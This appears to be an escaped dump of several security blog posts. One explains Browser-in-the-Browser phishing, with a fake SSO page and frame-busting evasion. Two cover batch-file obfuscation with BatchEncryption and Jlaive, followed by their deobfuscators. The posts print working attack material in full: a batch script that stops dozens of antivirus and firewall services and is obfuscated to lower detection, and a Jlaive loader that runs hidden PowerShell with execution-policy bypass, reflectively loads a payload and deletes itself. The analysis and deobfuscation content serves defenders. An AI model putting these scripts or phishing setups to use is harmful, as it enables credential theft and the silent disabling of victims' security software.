id=\u0026#34;domain-path\u0026#34;\u0026gt;/signin.html\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- Content start --\u0026gt; \u0026lt;iframe id=\u0026#34;content\u0026#34; src=\u0026#34;https://44e5-46-177-73-144.ngrok-free.app\u0026#34; frameBorder=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; The victim should now see the following window, which seems legitimate: Upon entering the credentials, we should see them in our server: We could also write code to forward the user to the real login of the website we mimiced and pass the given creds as parameters to avoid further suspicion.\nDefenses The way this attack was initially detected was by trying to drag the SSO window out of the browser window. If the SSO window was not able to escape the outter window, this meant that it was fake.\nLater on, a plugin came out that would identify such windows by the use of their iframes and warn users about this attack. This is done with a technique known as frame busting, a technique now used by most of the known browsers. This leads to BitB being heavily detected and can burn your phishing domain. In order to avoid BitB being detected, you must somehow heavily obfuscate/hide it.\nSo if we somehow managed to solve the defense mechanism that checks for iframes, we would have a successful BitB phishing attack, which brings us to the next section on how to implement this attack without iframes and with the help of evilginx.\nBitB without iframes In this technique, apache and evilginx is utilized alongside with many css and html tricks, avoiding the use of iframes and thus making a more complicated (\u0026ldquo;obfuscated\u0026rdquo;) approach that is not that easy to detect. As the developer of this developed technique stated in his github repo: Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page. This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect. We also use an additional trick called \u0026ldquo;Shadow DOM\u0026rdquo; in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.\nThe result is a fully working, undetected to framebusters SSO window using the bitb technique:\nThere are many things going on in frameless BitB but Wael Masri does a great job explaining the ins and outs of this technique and how you could replicate it:\nReferences\n[1] Mr.d0x: Browser In The Browser (BITB) Attack\r[2] Cofense email security: Browser-in-the-Browser (BitB) Attack Takes Advantage of Single-Sign-On Trust\r[3] Infinite Logins: Browser in the Browser (BITB) Phishing Technique\r[3] Wael Masri: How To: Evilginx + BITB | Browser In The Browser without iframes in 2024\r[4] waelmas: frameless-bitb\r","permalink":"http://localhost:1313/posts/bitb/","summary":"\u003ch2 id=\"what-is-the-browser-in-the-browser-attack\"\u003eWhat is the Browser-in-the-Browser attack\u003c/h2\u003e\n\u003cp\u003eBitB attack is a phishing technique displayed by \u003cstrong\u003emr.d0x\u003c/strong\u003e that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\u003c/p\u003e\n\u003cp\u003eBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.\u003c/p\u003e","title":"Browser-in-the-Browser (BitB) attack"},{"content":"What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (\u0026quot;\u0026rsquo;\u0026quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.\nThe use of this tool was seen back in 2017 in the Jawlan and Suriya.doc (SHA-256: 761483906b45fad51f3c7ab66b1534dee137e93a52816aa270bc97249acb56d0) and has almost unknown at the time, with only 3 google search results. Now it has started to pop up more (mainly in .cn forums).\nAn example of a batch file obfuscated with BatchEncryption can be seen below:\nThe nice thing about this tool is that still in this day, it manages to get low AV detection in VT. Let\u0026rsquo;s take a .bat sample that disables multiple different AV engines:\nset ii=ne set ywe=st set ury=t set iej=op set jt53=Syma set o6t=nor set lyd2=fee set h3d=ton set gf45=ntec set own5=McA net stop \u0026#34;Security Center\u0026#34; /y net stop \u0026#34;Automatic Updates\u0026#34; /y net stop \u0026#34;Symantec Core LC\u0026#34; /y net stop \u0026#34;SAVScan\u0026#34; /y net stop \u0026#34;norton AntiVirus Firewall Monitor Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto-Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;McAfee Spamkiller Server\u0026#34; /y net stop \u0026#34;McAfee Personal Firewall Service\u0026#34; /y net stop \u0026#34;McAfee SecurityCenter Update Manager\u0026#34; /y net stop \u0026#34;Symantec SPBBCSvc\u0026#34; /y cls net stop \u0026#34;Ahnlab Task Scheduler\u0026#34; /y net stop navapsvc /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y net stop vrmonsvc /y net stop MonSvcNT /y net stop SAVScan /y net stop NProtectService /y net stop ccSetMGR /y net stop ccEvtMGR /y net stop srservice /y net stop \u0026#34;Symantec Network Drivers Service\u0026#34; /y net stop \u0026#34;norton Unerase Protection\u0026#34; /y net stop MskService /y net stop MpfService /y net stop mcupdmgr.exe /y net stop \u0026#34;McAfeeAntiSpyware\u0026#34; /y net stop helpsvc /y net stop ERSvc /y net stop \u0026#34;*norton*\u0026#34; /y net stop \u0026#34;*Symantec*\u0026#34; /y net stop \u0026#34;*McAfee*\u0026#34; /y cls net stop ccPwdSvc /y net stop \u0026#34;Symantec Core LC\u0026#34; /y net stop navapsvc /y net stop \u0026#34;Serv-U\u0026#34; /y net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Client\u0026#34; /y net stop \u0026#34;Symantec AntiVirus Client\u0026#34; /y net stop \u0026#34;norton AntiVirus Server\u0026#34; /y net stop \u0026#34;NAV Alert\u0026#34; /y net stop \u0026#34;Nav Auto-Protect\u0026#34; /y cls net stop \u0026#34;McShield\u0026#34; /y net stop \u0026#34;DefWatch\u0026#34; /y net stop eventlog /y net stop InoRPC /y net stop InoRT /y net stop InoTask /y cls net stop \u0026#34;norton AntiVirus Auto Protect Service\u0026#34; /y net stop \u0026#34;norton AntiVirus Client\u0026#34; /y net stop \u0026#34;norton AntiVirus Corporate Edition\u0026#34; /y net stop \u0026#34;ViRobot Professional Monitoring\u0026#34; /y net stop \u0026#34;PC-cillin Personal Firewall\u0026#34; /y net stop \u0026#34;Trend Micro Proxy Service\u0026#34; /y net stop \u0026#34;Trend NT Realtime Service\u0026#34; /y net stop \u0026#34;McAfee.com McShield\u0026#34; /y net stop \u0026#34;McAfee.com VirusScan Online Realtime Engine\u0026#34; /y net stop \u0026#34;SyGateService\u0026#34; /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y cls net stop \u0026#34;Sophos Anti-Virus\u0026#34; /y net stop \u0026#34;Sophos Anti-Virus Network\u0026#34; /y net stop \u0026#34;eTrust Antivirus Job Server\u0026#34; /y net stop \u0026#34;eTrust Antivirus Realtime Server\u0026#34; /y net stop \u0026#34;Sygate Personal Firewall Pro\u0026#34; /y net stop \u0026#34;eTrust Antivirus RPC Server\u0026#34; /y cls net stop netsvcs net stop spoolnt The VT result of this is the following:\n(I got to admin I was expecting more).\nNow let\u0026rsquo;s use the BatchEncryption tool to obfuscate our sample and load it again: In just a text editor we can\u0026rsquo;t really see what\u0026rsquo;s going on because of the encoding used, but if we load it for example in cyberchef, it gets converted to utf8 and thus we can see readable chars. Anyways, we can see that indeed a lot of stuff is going on. Custom, existing envars, caret symbol for extra obfuscation etc. We also notice a header on top, which is the author of the program (gwsbhqt@163.com). Let\u0026rsquo;s load it to VT and watch what happens:\nWe successfully reduced our results to only 3! For any of you wondering what would happen if we had removed the header of the author and load it again, it would give the same results.\nLet\u0026rsquo;s now see how we can deobfuscate samples obfuscated with this technique.\nBatch-Encryption-DeCoder Luckily for us, there is already a tool for this purpose, which can be found here:\nhttps://github.com/cnHopeStudio/Batch-Encryption-DeCoder We need to build this tool to get the final executable, which when run, gives us the original batch file:\nReferences\n[1] blackhat: Exploring the Depths\rof Cmd.exe Obfuscation and Detection Techniques\r[2] Amit: Recipient batch processing documents confused by BatchEncryption (version 201610)\r[3] gwsbhqt: [Original Tool][201610]BatchEncryption-BatchEncrying Encryption\r","permalink":"http://localhost:1313/posts/batchencryption/","summary":"\u003ch2 id=\"what-is-the-batchencryption-tool\"\u003eWhat is the BatchEncryption tool\u003c/h2\u003e\n\u003cp\u003eThe BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (\u0026quot;\u0026rsquo;\u0026quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.\u003c/p\u003e","title":"Exploring the BatchEncryption tool (and its deobfuscator) by gwsbhqt@163.com "},{"content":"What will this post be about This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.\nWhat is the Jlaive tool In short terms, Jlaive is a tool used to convert executables to undetectable .bat scripts for AV evasion. This tool is very similar to the well known BatCloak engine which was used to create such undetectable .bat scripts. As the scmagazine states \u0026hellip;Researchers tie BatCloak closely to another, now abandoned, BAT obfuscation tool called Jlaive\u0026hellip;Trend Micro said that the BatCloak engine is the core engine of Jlaive’s obfuscation algorithm, now repurposed. The BatCloak functionality is specifically tied to the instructions “LineObfuscation.cs and FileObfuscation.cs” used in the Jlaive crimeware.\nThere are many tools with similar goals, like the ScrubCrypt, but they are closed-source for better monetization and avoide the use of them from other cyber criminal groups. Anyway, lucky for us, we got a hold of the Jlaive tool and we are going to explore it in a simple poc executable.\nSimple poc The poc is nothing more than a MsgBox:\nusing System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace pocHello { internal class Program { static void Main(string[] args) { MessageBox.Show(\u0026#34;just an msgbox as a poc\u0026#34;, \u0026#34;Message Box POC\u0026#34;, MessageBoxButtons.OK, MessageBoxIcon.Information); } } } After building the project, we simply run the tool and load our executable, choosing what features we would like the obfuscated .bat file to have:\nRunning the tool, we get a successful message:\nNavigating to the path where the .bat file was created, we are met with the following code:\n@echo off echo F|xcopy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u0026#34;%~dp0%~nx0.exe\u0026#34; /y attrib +s +h \u0026#34;%~dp0%~nx0.exe\u0026#34; cls cd %~dp0 set \u0026#34;fENYbyZJkq=3IHsgcHVib\u0026#34; set \u0026#34;oMDpdCkaMN=k = [Syste\u0026#34; set \u0026#34;HlBoTjvPwk=6UdLqADvWw\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TgmwRYHkmK=ucHV0Lkxlb\u0026#34; set \u0026#34;nVaFdaubIS=npolicy by\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BIXBCNceka=gSUNyeXB0b\u0026#34; \u0026amp;\u0026amp; set \u0026#34;YNWXZHqJqc=gZ3MuRGlzc\u0026#34; set \u0026#34;tQIzxvQESC=GtleSwgYnl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;XOhAfBkWmm=vert]::Fro\u0026#34; set \u0026#34;kLMTZqURfX=U), [Syste\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qVRmUESgbg=$tIukXz = \u0026#34; \u0026amp;\u0026amp; set \u0026#34;saTMAKUycO=SBpbnB1dCw\u0026#34; \u0026amp;\u0026amp; set \u0026#34;KdmMRlyyEK=nlwdG9yLlR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PMyINOXuEO=GJ5dGVbXSB\u0026#34; set \u0026#34;FscnzUUuAC=::FromBase\u0026#34; set \u0026#34;BARCwvwdkW=-noprofile\u0026#34; \u0026amp;\u0026amp; set \u0026#34;vwRxWzGiFE=))).EntryP\u0026#34; set \u0026#34;sMNjHgEuTS=md0aCk7IGR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZMFfhtZaCd=n $tIukXz;\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NRBHbUNrkG=etString([\u0026#34; \u0026amp;\u0026amp; set \u0026#34;tNCgPVjCku=kID0gZGVjc\u0026#34; set \u0026#34;CDtNvqDvqL=ngth - 1];\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ieHoPTyjEy=mBase64Str\u0026#34; \u0026amp;\u0026amp; set \u0026#34;rajcuUaXTP=m.IO.File]\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ihrpBFSJkF=Gh5OyBwdWJ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ObqwUWcIse=yZXR1cm4gb\u0026#34; set \u0026#34;wrxnxJJZUi=10gY1VaaUJ\u0026#34; set \u0026#34;tPPsLfEmfH=ssembly]::\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wYpmPrqEes=0ZW0uU2Vjd\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PeMJlFunvD=%~nx0.exe \u0026#34; \u0026amp;\u0026amp; set \u0026#34;xRRkIyDKnV=GUgPSBDaXB\u0026#34; set \u0026#34;LguDwtEgTm=ing(\u0026#39;dXNpb\u0026#34; set \u0026#34;rBnjvHzCEC=SwgaXYpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BwxNyGNeWs=and $NDmNb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NOLCAWkezL=XJpdHkuQ3J\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JxakJbogEh=c212SWxpVX\u0026#34; set \u0026#34;avLgdUKvyf=System.Con\u0026#34; set \u0026#34;dzLmqrEuSn=Load([DuUJ\u0026#34; set \u0026#34;buYFlxnyag=mcgU3lzdGV\u0026#34; set \u0026#34;JrzOnKokrg=G8obXNvKTs\u0026#34; set \u0026#34;VKtWSAzekf=kaW5nTW9kZ\u0026#34; set \u0026#34;UDLwXXbfUO=eDefinitio\u0026#34; set \u0026#34;pZCqseAkqe=ext(\u0026#39;%~f0\u0026#39;).Split([Environment]::NewLine);$WWCkvU \u0026#34; set \u0026#34;bEuenIEGAB=ert]::From\u0026#34; set \u0026#34;evGNjFJkiq=::ReadAllT\u0026#34; set \u0026#34;EtpzUbnYkW=XRlRGVjcnl\u0026#34; set \u0026#34;rAJgHQskWM=3VzaW5nIFN\u0026#34; \u0026amp;\u0026amp; set \u0026#34;nUMBtoFYkK=yBNZW1vcnl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;DlNUGnnsfJ=gTWVtb3J5U\u0026#34; \u0026amp;\u0026amp; set \u0026#34;tguYxsQeEG=hbmFnZWQgY\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZxsoDXEAmh=::cUZiBs([\u0026#34; set \u0026#34;rrBdlEgEiR=\u0026#34; \u0026amp;\u0026amp; set \u0026#34;yuBNvyTjWG=ieXRlW10gZ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;EpkleGpiSQ=zLlBhZGRpb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;hlfUYJcbnE=//github.c\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JaaFxTqmkm=zKGJ5dGVbX\u0026#34; set \u0026#34;ovxvfokepJ=yA9IG5ldyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NdBkzRUyNc=-Type -Typ\u0026#34; set \u0026#34;cECnVddQIO=gYWVzLk1vZ\u0026#34; set \u0026#34;JYdzLMkAMI=zdGVtLklPO\u0026#34; set \u0026#34;LIJyjYDhEO=mBase64Str\u0026#34; set \u0026#34;FQDboAlVkm=0cmVhbSBtc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;CtISDxCuyg=$NDmNbk.Le\u0026#34; set \u0026#34;cPhgSHJFiE=laive\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wOUbaaionW=8dQ=\u0026#39;), [S\u0026#34; set \u0026#34;TFqYzkUFKP=oZXJNb2RlL\u0026#34; \u0026amp;\u0026amp; set \u0026#34;XmJlbVCEeg=ybSBkZWNye\u0026#34; set \u0026#34;rsAojPyqqK=pass -comm\u0026#34; set \u0026#34;HjDUCECfuK=vY2soaW5wd\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RLYjZdmUem=i5EaXNwb3N\u0026#34; set \u0026#34;JmcNfgjlkO=3IE1lbW9ye\u0026#34; set \u0026#34;wotBbJUCXp=28gPSBuZXc\u0026#34; set \u0026#34;ZMbsYBZiEq=S5QS0NTNzs\u0026#34; set \u0026#34;JWEGEWztyS=y5Db21wcmV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wYGjMTSRLU=G9zZSgpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RZdMvuYUqn=tLlRleHQ7d\u0026#34; set \u0026#34;DDhHMvstEO=GljIHN0YXR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BLkZldvAHE=TdHJlYW0gb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;HkRRYWZUWm=7IHZhciBnc\u0026#34; set \u0026#34;EvYPmaikjR=lY3J5cHRvc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;NUGvGuKfkH=]] (\u0026#39;%*\u0026#39;)))\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TiPQaNUyEk=om/ch2sh/J\u0026#34; \u0026amp;\u0026amp; set \u0026#34;mMQdKSFyum=yeXB0ZWQ7I\u0026#34; set \u0026#34;FFeCIpqPyy= -windowst\u0026#34; set \u0026#34;lYRjpzjmyM=mcgPSBQYWR\u0026#34; \u0026amp;\u0026amp; set \u0026#34;jEdNSXkuFv=oint.Invok\u0026#34; set \u0026#34;UeVhkuMOtk=XNpID0gbmV\u0026#34; set \u0026#34;reZEtGxrSh=y5EaXNwb3N\u0026#34; \u0026amp;\u0026amp; set \u0026#34;uPqpbVZyku=ystem.Conv\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QbZOQhYmgk=Fw]::YWqYu\u0026#34; set \u0026#34;ljXHtMvGyf=jIHN0YXRpY\u0026#34; \u0026amp;\u0026amp; set \u0026#34;LulfiaLhEe=XNpbmcgU3l\u0026#34; set \u0026#34;GVtjxQXtOo=zc2lvbjt1c\u0026#34; set \u0026#34;EyEeayRkCp=m.Convert]\u0026#34; \u0026amp;\u0026amp; set \u0026#34;VTmkqOOkQh=5c3RlbS5JT\u0026#34; set \u0026#34;DJZvlJxSeK=flection.A\u0026#34; set \u0026#34;VrbuAavxUi=XQsIDAsIGl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ytnErceFKM=G9zZSgpOyB\u0026#34; set \u0026#34;WsBCQAkGPI=mFnZWQoKTs\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ZeKpegxEqf=UZpbmFsQmx\u0026#34; \u0026amp;\u0026amp; set \u0026#34;fYjkFWUCLu=e($null, (\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qbrRUujXDM=lKCk7IGFlc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TcbXekUkOV=Base64Stri\u0026#34; \u0026amp;\u0026amp; set \u0026#34;ryOJrbkGXw=ncy5Db3B5V\u0026#34; \u0026amp;\u0026amp; set \u0026#34;gBhbYMmkar=HWmlwU3RyZ\u0026#34; set \u0026#34;xFXbUXSqiH=hZXMuQ3JlY\u0026#34; set \u0026#34;jUxqxtJWwK=XB0b3IgPSB\u0026#34; set \u0026#34;cUNiABJEPG=64String(\u0026#39;\u0026#34; set \u0026#34;BYliuSSkds=E1lbW9yeVN\u0026#34; set \u0026#34;DgsMJGRBkW=kNCQzsgYWV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;yxMQSdikCf=System.Con\u0026#34; \u0026amp;\u0026amp; set \u0026#34;pqydlkWvlv=yYW5zZm9yb\u0026#34; set \u0026#34;xmGqfoyigz=yYXkoKTsgf\u0026#34; \u0026amp;\u0026amp; set \u0026#34;mKWZuiSqkG= -executio\u0026#34; set \u0026#34;pWisjkyuvo=g]::UTF8.G\u0026#34; \u0026amp;\u0026amp; set \u0026#34;RdergtMaPv=3MgRHVVSkZ\u0026#34; \u0026amp;\u0026amp; set \u0026#34;FoeUHvtBeI=3RyZWFtKCk\u0026#34; set \u0026#34;PtbWQSaxkP=gYnl0ZVtdI\u0026#34; \u0026amp;\u0026amp; set \u0026#34;prlyUalgGj=, [string[\u0026#34; \u0026amp;\u0026amp; set \u0026#34;qfhEOMrfue=rem https:\u0026#34; set \u0026#34;EHNuBdghke=XNvLlRvQXJ\u0026#34; set \u0026#34;atzklLZikC=ieXRlcyk7I\u0026#34; set \u0026#34;VzZHdHfnkK=wdG9yKGtle\u0026#34; \u0026amp;\u0026amp; set \u0026#34;pbEQoHEFya=3Npb25Nb2R\u0026#34; set \u0026#34;wyIRpJUzUy=ng(\u0026#39;i9gKth\u0026#34; set \u0026#34;aRvucOwBMK=lLkRlY29tc\u0026#34; set \u0026#34;ZGtoXTmqEa=vert]::Fro\u0026#34; \u0026amp;\u0026amp; set \u0026#34;LBXFmXrGGk=yle hidden\u0026#34; \u0026amp;\u0026amp; set \u0026#34;PgpYWgnESr=SB9\u0026#39;));Add\u0026#34; \u0026amp;\u0026amp; set \u0026#34;jQJlvwKnUC=HVybiBkZWN\u0026#34; set \u0026#34;yutyGaKptk=pYyBieXRlW\u0026#34; set \u0026#34;NrVzEyZKxJ=gWVdxWXVPK\u0026#34; set \u0026#34;ElUeqoZkeB=5cHRvZ3Jhc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;VqDUHkduHE=HJlc3MpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;bXuhcMQWEC=tc2kuRGlzc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;wIkgxuqwSU=ieXRlcykge\u0026#34; \u0026amp;\u0026amp; set \u0026#34;BeUppPecxE=xt.Encodin\u0026#34; \u0026amp;\u0026amp; set \u0026#34;JXrPZaVOUG=G9zZSgpOyB\u0026#34; \u0026amp;\u0026amp; set \u0026#34;FclUyvUGNa=WVzID0gbmV\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QQwGKBkSYC=WS5VvlzyRn\u0026#34; \u0026amp;\u0026amp; set \u0026#34;QSDzwOfsqN=saWMgY2xhc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;nNEnadmgAy=SB7IEFlc01\u0026#34; set \u0026#34;ZSnQhDQxOJ=WFtKG1zaSw\u0026#34; set \u0026#34;hCSlczZEed=[System.Re\u0026#34; set \u0026#34;tAyNMEciUo=VN0cmVhbSh\u0026#34; \u0026amp;\u0026amp; set \u0026#34;lELXxFDard=O([DuUJFw]\u0026#34; set \u0026#34;nNsRHgWaoU== $NDmNbk[\u0026#34; set \u0026#34;ldbJMTqUaX=0ZVtdIGl2K\u0026#34; \u0026amp;\u0026amp; set \u0026#34;sSUxwkECwE=1RyYW5zZm9\u0026#34; \u0026amp;\u0026amp; set \u0026#34;IYUhcqkikI=1hMu1g==\u0026#39;)\u0026#34; set \u0026#34;rgNaXziIpC=GVjcnlwdGV\u0026#34; set \u0026#34;xdaAAuWEqb=3IEFlc01hb\u0026#34; \u0026amp;\u0026amp; set \u0026#34;TYDLSAjkyA=gQ29tcHJlc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;GgmonIEaZP=ing($WWCkv\u0026#34; set \u0026#34;IArsKCeeLv=tc28uRGlzc\u0026#34; \u0026amp;\u0026amp; set \u0026#34;oLgiwxduaV=H0gcHVibGl\u0026#34; \u0026amp;\u0026amp; set \u0026#34;GNZxLtdDkO=[System.Te\u0026#34; set \u0026#34;amOerQZEai=OxhVVfEWSN\u0026#34; \u0026amp;\u0026amp; set \u0026#34;fHTMzMCrak=yBieXRlW10\u0026#34; set \u0026#34;kKopFOwikC=2luZyBTeXN\u0026#34; set \u0026#34;occQjttmnX=lKCk7IHJld\u0026#34; set \u0026#34;eZKAFlWkCV=MlVcdDTvXm\u0026#34; %qfhEOMrfue%%hlfUYJcbnE%%TiPQaNUyEk%%cPhgSHJFiE% %PeMJlFunvD%%BARCwvwdkW%%FFeCIpqPyy%%LBXFmXrGGk%%mKWZuiSqkG%%nVaFdaubIS%%rsAojPyqqK%%BwxNyGNeWs%%oMDpdCkaMN%%rajcuUaXTP%%evGNjFJkiq%%pZCqseAkqe%%nNsRHgWaoU%%CtISDxCuyg%%CDtNvqDvqL%%qVRmUESgbg%%GNZxLtdDkO%%BeUppPecxE%%pWisjkyuvo%%NRBHbUNrkG%%avLgdUKvyf%%ZGtoXTmqEa%%LIJyjYDhEO%%LguDwtEgTm%%buYFlxnyag%%RZdMvuYUqn%%LulfiaLhEe%%JYdzLMkAMI%%rAJgHQskWM%%VTmkqOOkQh%%JWEGEWztyS%%GVtjxQXtOo%%kKopFOwikC%%wYpmPrqEes%%NOLCAWkezL%%ElUeqoZkeB%%ihrpBFSJkF%%QSDzwOfsqN%%RdergtMaPv%%fENYbyZJkq%%DDhHMvstEO%%yutyGaKptk%%wrxnxJJZUi%%JaaFxTqmkm%%saTMAKUycO%%PtbWQSaxkP%%tQIzxvQESC%%ldbJMTqUaX%%nNEnadmgAy%%tguYxsQeEG%%FclUyvUGNa%%xdaAAuWEqb%%WsBCQAkGPI%%cECnVddQIO%%xRRkIyDKnV%%TFqYzkUFKP%%DgsMJGRBkW%%EpkleGpiSQ%%lYRjpzjmyM%%VKtWSAzekf%%ZMbsYBZiEq%%BIXBCNceka%%sSUxwkECwE%%XmJlbVCEeg%%jUxqxtJWwK%%xFXbUXSqiH%%EtpzUbnYkW%%VzZHdHfnkK%%rBnjvHzCEC%%yuBNvyTjWG%%rgNaXziIpC%%tNCgPVjCku%%KdmMRlyyEK%%pqydlkWvlv%%ZeKpegxEqf%%HjDUCECfuK%%VrbuAavxUi%%TgmwRYHkmK%%sMNjHgEuTS%%EvYPmaikjR%%RLYjZdmUem%%qbrRUujXDM%%reZEtGxrSh%%occQjttmnX%%jQJlvwKnUC%%mMQdKSFyum%%oLgiwxduaV%%ljXHtMvGyf%%fHTMzMCrak%%NrVzEyZKxJ%%PMyINOXuEO%%wIkgxuqwSU%%nUMBtoFYkK%%BLkZldvAHE%%UeVhkuMOtk%%JmcNfgjlkO%%tAyNMEciUo%%atzklLZikC%%BYliuSSkds%%FQDboAlVkm%%wotBbJUCXp%%DlNUGnnsfJ%%FoeUHvtBeI%%HkRRYWZUWm%%ovxvfokepJ%%gBhbYMmkar%%ZSnQhDQxOJ%%TYDLSAjkyA%%pbEQoHEFya%%aRvucOwBMK%%VqDUHkduHE%%ryOJrbkGXw%%JrzOnKokrg%%YNWXZHqJqc%%JXrPZaVOUG%%bXuhcMQWEC%%wYGjMTSRLU%%IArsKCeeLv%%ytnErceFKM%%ObqwUWcIse%%EHNuBdghke%%xmGqfoyigz%%PgpYWgnESr%%NdBkzRUyNc%%UDLwXXbfUO%%ZMFfhtZaCd%%hCSlczZEed%%DJZvlJxSeK%%tPPsLfEmfH%%dzLmqrEuSn%%QbZOQhYmgk%%lELXxFDard%%ZxsoDXEAmh%%yxMQSdikCf%%XOhAfBkWmm%%ieHoPTyjEy%%GgmonIEaZP%%kLMTZqURfX%%EyEeayRkCp%%FscnzUUuAC%%cUNiABJEPG%%HlBoTjvPwk%%QQwGKBkSYC%%JxakJbogEh%%eZKAFlWkCV%%wOUbaaionW%%uPqpbVZyku%%bEuenIEGAB%%TcbXekUkOV%%wyIRpJUzUy%%amOerQZEai%%IYUhcqkikI%%vwRxWzGiFE%%jEdNSXkuFv%%fYjkFWUCLu%%prlyUalgGj%%NUGvGuKfkH% %rrBdlEgEiR% attrib -s -h \u0026#34;%~dp0%~nx0.exe\u0026#34; del \u0026#34;%~dp0%~nx0.exe\u0026#34;(goto) 2\u0026gt;nul \u0026amp; del \u0026#34;%~f0\u0026#34; exit /b jjNNb7+5GJxTidTZUiwqq6EMDNO1MKBC21fz5d08N7l -- a bunch more of b64 encrypted bytes --- A great resource explaining the commands used in the batch file is a post made by Jose Luis Sánchez Martínez in his blog (which I will leave in the references). He gives an overview of what calls are being made when we execute this obfuscated .bat file and also a poc of rules to detect such malicious files (although, they could be bypassed).\nRunning this batch script gives the same output as our original executable:\nAfter we run this, the .bat file gets deleted - well, its contents gets deleted - and a new file, with an .exe extension appears to have been created:\nThis is where the tool Get-UnJlaive will come into play, which will take advantage of this and manage to deobfuscate the script and give the original .exe code.\nGet-UnJlaive Now onto the deobfuscation part. Get-UnJlaive is a tool able to reconstruct Jlaive (.NET Antivirus Evasion Tool (Exe2Bat)) to original Assembly and stub Assembly, as the author states. We are going to use his tool which can be found in the following repo (also has an amazing channel which I will leave in the references):\nhttps://github.com/Dump-GUY/Get-UnJlaive Basically what this tool does is to run the .bat file, set it in a suspended state to get the deobfuscated form (as we previously saw, a .exe was created after we had run the .bat), decrypt it, reconstruct the original assembly and then terminates it. For an indepth analysis of how this tool works, you can watch the video of dumpguy which I\u0026rsquo;ll leave in the references.\nReconstructing the original assembly The tool is easy to set. You simple just open a powershell terminal, load the module provided and you are good to go. After you run the tool, you should get a file with an extension \u0026ldquo;.bat_orig.exe\u0026rdquo; which you could load into DnSpy for example and view its code: Aaand we have successfully reconstructed our original .exe from the obfuscated batch file!\nBonus tool - get all the intermediate generated files As a bonus tool, there is a tool I made using python in order to also get all the intermediate files that are being created rather than only the final executable. The tool can be found at my github.\nExample outout from running the tool:\n──(connar㉿kali)-[~/Documents/JlaiveCustomDeobfuscator] └─$ python unjlaive.py [*] Sample deobfuscated successfully. Writting result to cleared_Jlaive.ps1 [*] Extracted Key: KsXDu/ZuLORpumzY7tRqieLJCAHO4HhkWSLGTa9vFUs= [*] Extracted IV: NP/92qw/SR3ausC7GbKhag== [*] Extracted the wzpaloqi.0.cs file. Writting to wzpaloqi.0.cs 